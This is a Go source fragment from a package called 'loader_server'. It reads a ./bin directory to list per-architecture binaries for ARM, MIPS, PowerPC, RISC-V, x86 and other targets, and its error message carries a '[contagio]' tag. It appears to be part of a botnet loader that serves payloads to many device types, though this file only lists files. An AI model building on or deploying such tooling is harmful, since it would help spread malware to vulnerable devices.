package loader_server

import (
	"fmt"
	"os"
	"sync"
)

// var Archs = []string{
// 	"arm5.bin",
// 	"arm6.bin",
// 	"arm7.bin",
// 	"mips.bin",
// 	"mips32le.bin",
// 	"mips64le.bin",
// 	"ppc64.bin",
// 	"riscv.bin",
// 	"s390x.bin",
// 	"x32.bin",
// 	"x86_64.bin",
// }

var Archs = make([]string, 0)

func GetArchs(wg *sync.WaitGroup) {
	archs, err := os.ReadDir("./bin/")
	if err != nil {
		fmt.Println("[contagio] Can't read ./bin dir")
		wg.Done()
		return
	}

	for _, arch := range archs {
		Archs = append(Archs, arch.Name())
	}

}
